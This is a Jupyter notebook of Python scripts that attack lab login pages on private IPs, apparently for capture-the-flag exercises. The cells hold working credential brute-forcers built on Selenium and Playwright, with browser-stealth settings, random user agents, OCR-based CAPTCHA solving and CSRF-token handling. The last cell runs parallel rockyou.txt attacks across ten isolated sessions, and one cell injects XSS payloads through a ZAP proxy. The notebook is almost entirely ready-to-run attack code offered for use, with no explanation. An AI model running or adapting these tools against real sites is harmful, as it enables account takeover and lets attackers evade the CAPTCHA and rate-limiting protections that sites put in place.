In [ ]:
from selenium.webdriver.common.by import By
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium_stealth import stealth

import time
import logging
from fake_useragent import UserAgent

options = Options()
ua = UserAgent()
userAgent = ua.random
options.add_argument('--no-sandbox')
options.add_argument('--headless')
options.add_argument("start-maximized")
options.add_argument(f'user-agent={userAgent}')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--disable-cache')
options.add_argument('--disable-gpu')

options.binary_location = "/usr/bin/google-chrome"
service = Service(executable_path='chromedriver-linux64/chromedriver')
chrome = webdriver.Chrome(service=service, options=options)

stealth(chrome,
    languages=["en-US", "en"],
    vendor="Google Inc.",
    platform="Win32",
    webgl_vendor="Intel Inc.",
    renderer="Intel Iris OpenGL Engine",
    fix_hairline=True,
)

# CONFIG
ip = 'http://10.82.141.208/labs/lab1/'
login_url = f'{ip}/index.php'
dashboard_url = f'{ip}/dashboard.php'

# Credentials to brute-force
username = "admin"
passwords = ["123456", "admin", "letmein", "pass123", "password"]  # Replace with file if needed

# Loop over passwords
for password in passwords:
    chrome.get(login_url)
    time.sleep(0.5)

    # Grab CSRF token
    #csrf = chrome.find_element(By.NAME, "csrf_token").get_attribute("value")

    # Fill out login form
    chrome.find_element(By.NAME, "username").send_keys(username)
    chrome.find_element(By.NAME, "password").send_keys(password)
    #chrome.find_element(By.NAME, "csrf_token").send_keys(csrf)
    chrome.find_element(By.TAG_NAME, "form").submit()

    time.sleep(0.5)

    # Check if login successful (simple way)
    if dashboard_url in chrome.current_url:
        print(f"[+] Login successful with password: {password}")
        flag_element = chrome.find_element(By.TAG_NAME, "p")
        flag = flag_element.text.strip()
        print(f"[+] {flag}")
        break
    else:
        print(f"[-] Failed login with: {password}")

chrome.quit()

In [ ]:
from selenium.webdriver.common.by import By
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium_stealth import stealth

import time
from fake_useragent import UserAgent
from PIL import Image, ImageEnhance, ImageFilter
import pytesseract
import io
import os

# Create folder for saving CAPTCHA images
os.makedirs("captchas", exist_ok=True)

options = Options()
ua = UserAgent()
userAgent = ua.random
options.add_argument('--no-sandbox')
options.add_argument('--headless')
options.add_argument("start-maximized")
options.add_argument(f'user-agent={userAgent}')
options.add_argument('--disable-dev-shm-usage')
options.add_argument('--disable-cache')
options.add_argument('--disable-gpu')

options.binary_location = "/usr/bin/google-chrome"
service = Service(executable_path='chromedriver-linux64/chromedriver')
chrome = webdriver.Chrome(service=service, options=options)

stealth(chrome,
    languages=["en-US", "en"],
    vendor="Google Inc.",
    platform="Win32",
    webgl_vendor="Intel Inc.",
    renderer="Intel Iris OpenGL Engine",
    fix_hairline=True,
)

# CONFIG
ip = 'http://10.10.234.138/labs/lab2'
login_url = f'{ip}/index.php'
dashboard_url = f'{ip}/dashboard.php'

username = "admin"
passwords = ["123456", "admin", "letmein", "password123", "password"]

for password in passwords:
    while True:
        chrome.get(login_url)
        time.sleep(1)

        # Grab CSRF token
        csrf = chrome.find_element(By.NAME, "csrf_token").get_attribute("value")

        # Get CAPTCHA image rendered in-browser
        captcha_img_element = chrome.find_element(By.TAG_NAME, "img")
        captcha_png = captcha_img_element.screenshot_as_png

        # Preprocess image for OCR
        image = Image.open(io.BytesIO(captcha_png)).convert("L")
        image = image.resize((image.width * 2, image.height * 2), Image.LANCZOS)  # Resize for clarity
        image = image.filter(ImageFilter.SHARPEN)
        image = ImageEnhance.Contrast(image).enhance(2.0)
        image = image.point(lambda x: 0 if x < 140 else 255, '1')

        # OCR the CAPTCHA
        captcha_text = pytesseract.image_to_string(
            image,
            config='--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789'
        ).strip().replace(" ", "").replace("\n", "").upper()

        # Save the image for review
        image.save(f"captchas/captcha_{password}_{captcha_text}.png")

        if not captcha_text.isalnum() or len(captcha_text) != 5:
            print(f"[!] OCR failed (got: '{captcha_text}'), retrying...")
            continue

        print(f"[*] Trying password: {password} with CAPTCHA: {captcha_text}")

        # Fill out and submit the form
        chrome.find_element(By.NAME, "username").send_keys(username)
        chrome.find_element(By.NAME, "password").send_keys(password)
        chrome.find_element(By.NAME, "captcha_input").send_keys(captcha_text)
        chrome.find_element(By.TAG_NAME, "form").submit()

        time.sleep(1)

        print("=== HTML Output After Submit ===")
        print(chrome.page_source)
        print("================================")

        if dashboard_url in chrome.current_url:
            print(f"[+] Login successful with password: {password}")
            try:
                flag = chrome.find_element(By.TAG_NAME, "p").text
                print(f"[+] {flag}")
            except:
                print("[!] Logged in, but no flag found.")
            chrome.quit()
            exit()
        else:
            print(f"[-] Failed login with: {password}")
            break  # try next password

chrome.quit()

In [ ]:
from playwright.async_api import async_playwright, Playwright
from zapv2 import ZAPv2, reports
import asyncio
import time
import os
import sys

class SilentOutput:
    def write(self, msg): pass
    def flush(self): pass

# Config
ZAP_KEY = "kcsbj07b6u7hhii6h3b772ia90"
PROXY = "http://localhost:8080"
TARGET_URL = "http://10.10.215.190:5000/"
xss_tests = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "\"><script>alert('XSS')</script>",
]

async def execute_automation():
    zap = ZAPv2(apikey=ZAP_KEY, proxies={'http': PROXY})
    zap.core.new_session(name="silent_passive", overwrite=True)

    async with async_playwright() as pw:
        browser = await pw.firefox.launch(headless=True)
        context = await browser.new_context(
            ignore_https_errors=True,
            proxy={"server": PROXY}
        )
        page = await context.new_page()

        for payload in xss_tests:
            print(f"Injecting Payload: {payload}")
            page.once("dialog", lambda dialog: asyncio.ensure_future(dialog.dismiss()))
            await page.goto(f"{TARGET_URL}?name={payload}")
            await asyncio.sleep(1)

        # Wait for ZAP passive scan to finish
        sys.stdout = SilentOutput()
        while int(zap.pscan.records_to_scan) > 0:
            await asyncio.sleep(1)
        sys.stdout = sys.__stdout__

        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        zap_reporter = reports(zap)
        zap_reporter.generate(
            title="Silent Passive XSS Scan",
            template="traditional-pdf",
            description="Clean scan",
            reportfilename="zap_passive_silent_report.pdf",
            reportdir=desktop_path,
            display=False,
        )
        print(f"[+] Report saved to: {os.path.join(desktop_path, 'zap_passive_silent_report.pdf')}")

        await browser.close()

await execute_automation()

In [ ]:
import asyncio
import sys
import threading
import io
import os
import shutil

from playwright.async_api import async_playwright
from PIL import Image, ImageEnhance, ImageFilter
import pytesseract

os.makedirs("captchas", exist_ok=True)

# CONFIG
ip = 'http://10.82.163.225/'
login_url = f'{ip}index.php'
dashboard_url = f'{ip}dashboard.php'

username = "admin"
ROCKYOU_PATH = "rockyou.txt"
MAX_PASSWORDS = 500

def configure_tesseract():
    # On Windows, tesseract.exe is typically installed here.
    if sys.platform == "win32":
        default_path = r"C:\Program Files\Tesseract-OCR\tesseract.exe"
        if os.path.exists(default_path):
            pytesseract.pytesseract.tesseract_cmd = default_path
            return

    # Fallback to any executable discoverable from PATH.
    discovered = shutil.which("tesseract")
    if discovered:
        pytesseract.pytesseract.tesseract_cmd = discovered
        return

    raise RuntimeError(
        "Tesseract OCR executable not found. Install it and restart the kernel. "
        "Windows default path: C:\\Program Files\\Tesseract-OCR\\tesseract.exe"
    )

def preprocess_captcha(png_bytes):
    image = Image.open(io.BytesIO(png_bytes)).convert("L")
    image = image.resize((image.width * 2, image.height * 2), Image.LANCZOS)
    image = image.filter(ImageFilter.SHARPEN)
    image = ImageEnhance.Contrast(image).enhance(2.0)
    image = image.point(lambda x: 0 if x < 140 else 255, "1")
    return image

def ocr_captcha(image):
    return pytesseract.image_to_string(
        image,
        config="--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789"
    ).strip().replace(" ", "").replace("\n", "").upper()

async def brute_force():
    configure_tesseract()

    with open(ROCKYOU_PATH, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()][:MAX_PASSWORDS]

    print(f"[*] Loaded {len(passwords)} passwords from rockyou.txt")

    async with async_playwright() as pw:
        browser = await pw.chromium.launch(headless=True)
        context = await browser.new_context()
        page = await context.new_page()

        for password in passwords:
            while True:
                await page.goto(login_url)
                await page.wait_for_load_state("networkidle")

                # OCR the CAPTCHA
                captcha_el = await page.query_selector("img")
                captcha_png = await captcha_el.screenshot()
                image = preprocess_captcha(captcha_png)
                captcha_text = ocr_captcha(image)

                if not captcha_text.isalnum() or len(captcha_text) != 5:
                    print(f"[!] OCR failed (got: '{captcha_text}'), retrying...")
                    continue

                image.save(f"captchas/captcha_{password}_{captcha_text}.png")
                print(f"[*] Trying: {password} | CAPTCHA: {captcha_text}")

                # Fill form using IDs from the HTML
                await page.fill("#username", username)
                await page.fill("#password", password)
                await page.fill("#captcha_input", captcha_text)

                # Click the JS login button (type="button" onclick="login()")
                await page.click("#login-btn")

                # Wait for navigation or AJAX to settle
                try:
                    await page.wait_for_url("**dashboard**", timeout=3000)
                except Exception:
                    pass

                await page.wait_for_load_state("networkidle")

                if dashboard_url in page.url:
                    print(f"[+] Login successful! Password: {password}")
                    try:
                        flag = await page.text_content("p")
                        print(f"[+] FLAG: {flag.strip()}")
                    except Exception:
                        print("[!] Logged in, but no flag element found.")
                    await browser.close()
                    return

                # Show error message from page
                error_el = await page.query_selector("#error-box")
                error_msg = await error_el.text_content() if error_el else ""
                normalized_error = error_msg.strip().lower()

                if "captcha" in normalized_error and (
                    "incorrect" in normalized_error
                    or "invalid" in normalized_error
                    or "falsch" in normalized_error
                ):
                    print(f"[!] CAPTCHA incorrect for password '{password}', retrying same password...")
                    continue

                print(f"[-] Failed: {password} | Error: {error_msg.strip()}")
                break

        print("[!] No valid password found in wordlist.")
        await browser.close()

def run_in_thread():
    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(brute_force())
    finally:
        loop.close()

thread = threading.Thread(target=run_in_thread)
thread.start()
thread.join()

In [ ]:
#mehrer Tabs, um parallel Passwörter zu testen (z.B. 10 Tabs mit je 50 Passwörtern aus rockyou.txt) und so die Gesamtzeit zu reduzieren. Jeder Tab sollte eine isolierte Browser-Context-Instanz verwenden, um CSRF-Token- und Session-Kollisionen zu vermeiden.
import asyncio
import sys
import threading
import io
import os
import shutil
import math

from playwright.async_api import async_playwright
from PIL import Image, ImageEnhance, ImageFilter
import pytesseract

os.makedirs("captchas", exist_ok=True)

# CONFIG
ip = 'http://10.81.158.101/'
login_url = f'{ip}index.php'
dashboard_url = f'{ip}dashboard.php'

username = "admin"
ROCKYOU_PATH = "rockyou.txt"
MAX_PASSWORDS = 200
TAB_COUNT = 10
CAPTCHA_RETRY_LIMIT = 8

def configure_tesseract():
    if sys.platform == "win32":
        default_path = r"C:\Program Files\Tesseract-OCR\tesseract.exe"
        if os.path.exists(default_path):
            pytesseract.pytesseract.tesseract_cmd = default_path
            return

    discovered = shutil.which("tesseract")
    if discovered:
        pytesseract.pytesseract.tesseract_cmd = discovered
        return

    raise RuntimeError(
        "Tesseract OCR executable not found. Install it and restart the kernel. "
        "Windows default path: C:\\Program Files\\Tesseract-OCR\\tesseract.exe"
    )

def preprocess_captcha(png_bytes):
    image = Image.open(io.BytesIO(png_bytes)).convert("L")
    image = image.resize((image.width * 2, image.height * 2), Image.LANCZOS)
    image = image.filter(ImageFilter.SHARPEN)
    image = ImageEnhance.Contrast(image).enhance(2.0)
    image = image.point(lambda x: 0 if x < 140 else 255, "1")
    return image

def ocr_captcha(image):
    return pytesseract.image_to_string(
        image,
        config="--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZ23456789"
    ).strip().replace(" ", "").replace("\n", "").upper()

def split_into_batches(items, batch_count):
    if not items:
        return []
    count = min(batch_count, len(items))
    size = math.ceil(len(items) / count)
    return [items[i:i + size] for i in range(0, len(items), size)]

def is_captcha_error(text):
    if not text:
        return True
    text = text.lower()
    return "captcha" in text and any(
        k in text for k in ["incorrect", "invalid", "falsch", "wrong", "failed"]
    )

async def get_csrf_token(page):
    selectors = [
        "input[name='csrf_token']",
        "input[name='csrf']",
        "input[name='_token']",
    ]
    for selector in selectors:
        element = await page.query_selector(selector)
        if element:
            value = await element.get_attribute("value")
            if value:
                return selector, value
    return None, None

async def try_password(page, tab_id, password, stop_event):
    captcha_retries = 0

    while not stop_event.is_set():
        await page.goto(login_url)
        await page.wait_for_load_state("networkidle")

        csrf_selector, csrf_value = await get_csrf_token(page)
        if csrf_selector and csrf_value:
            # Keep token in sync in case frontend JS reads and mutates this field.
            await page.eval_on_selector(csrf_selector, "(el, v) => { el.value = v; }", csrf_value)
        else:
            print(f"[Tab {tab_id}] No CSRF field detected on page (continuing)")

        captcha_el = await page.query_selector("img")
        if not captcha_el:
            print(f"[Tab {tab_id}] CAPTCHA image missing, reloading...")
            continue

        captcha_png = await captcha_el.screenshot()
        image = preprocess_captcha(captcha_png)
        captcha_text = ocr_captcha(image)

        if not captcha_text.isalnum() or len(captcha_text) != 5:
            print(f"[Tab {tab_id}] OCR failed '{captcha_text}', retry same password")
            continue

        image.save(f"captchas/tab{tab_id}_{password}_{captcha_text}.png")
        print(f"[Tab {tab_id}] Trying: {password} | CAPTCHA: {captcha_text}")

        await page.fill("#username", username)
        await page.fill("#password", password)
        await page.fill("#captcha_input", captcha_text)
        await page.click("#login-btn")

        try:
            await page.wait_for_url("**dashboard**", timeout=3000)
        except Exception:
            pass

        await page.wait_for_load_state("networkidle")

        if dashboard_url in page.url:
            flag = ""
            try:
                flag_raw = await page.text_content("p")
                flag = flag_raw.strip() if flag_raw else ""
            except Exception:
                pass
            return True, flag

        error_el = await page.query_selector("#error-box")
        error_msg = (await error_el.text_content()) if error_el else ""
        error_msg = (error_msg or "").strip()

        if is_captcha_error(error_msg):
            captcha_retries += 1
            print(
                f"[Tab {tab_id}] CAPTCHA incorrect for '{password}' "
                f"({captcha_retries}/{CAPTCHA_RETRY_LIMIT}) -> retry"
            )
            if captcha_retries >= CAPTCHA_RETRY_LIMIT:
                print(f"[Tab {tab_id}] Skip '{password}' after CAPTCHA retry limit")
                return False, ""
            continue

        if "csrf" in error_msg.lower() or "token" in error_msg.lower():
            print(f"[Tab {tab_id}] CSRF/token error for '{password}', retry same password")
            continue

        print(f"[Tab {tab_id}] Failed '{password}' | Error: {error_msg}")
        return False, ""

    return False, ""

async def run_batch(browser, tab_id, passwords_batch, stop_event, result, result_lock):
    # Separate context per tab prevents CSRF/session collisions across parallel tabs.
    context = await browser.new_context()
    page = await context.new_page()
    try:
        print(f"[Tab {tab_id}] Start batch with {len(passwords_batch)} passwords")
        for password in passwords_batch:
            if stop_event.is_set():
                return

            success, flag = await try_password(page, tab_id, password, stop_event)
            if success:
                async with result_lock:
                    if not stop_event.is_set():
                        result["password"] = password
                        result["flag"] = flag
                        stop_event.set()
                        print(f"[+] Tab {tab_id} found password: {password}")
                return
        print(f"[Tab {tab_id}] Batch finished")
    finally:
        await context.close()

async def brute_force_tabs():
    configure_tesseract()

    with open(ROCKYOU_PATH, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()][:MAX_PASSWORDS]

    batches = split_into_batches(passwords, TAB_COUNT)
    print(f"[*] Loaded {len(passwords)} passwords")
    print(f"[*] Running {len(batches)} parallel tabs (isolated sessions)")
    for i, batch in enumerate(batches, start=1):
        print(f"    Tab {i}: {len(batch)} passwords")

    stop_event = asyncio.Event()
    result = {"password": None, "flag": ""}
    result_lock = asyncio.Lock()

    async with async_playwright() as pw:
        browser = await pw.chromium.launch(headless=True)
        tasks = [
            asyncio.create_task(run_batch(browser, i + 1, batch, stop_event, result, result_lock))
            for i, batch in enumerate(batches)
        ]
        await asyncio.gather(*tasks, return_exceptions=False)
        await browser.close()

    if result["password"]:
        print(f"[+] Login successful! Password: {result['password']}")
        if result["flag"]:
            print(f"[+] FLAG: {result['flag']}")
        else:
            print("[!] Logged in, but no flag element found.")
    else:
        print("[!] No valid password found in tested batches.")

def run_in_thread():
    if sys.platform == "win32":
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(brute_force_tabs())
    finally:
        loop.close()

thread = threading.Thread(target=run_in_thread)
thread.start()
thread.join()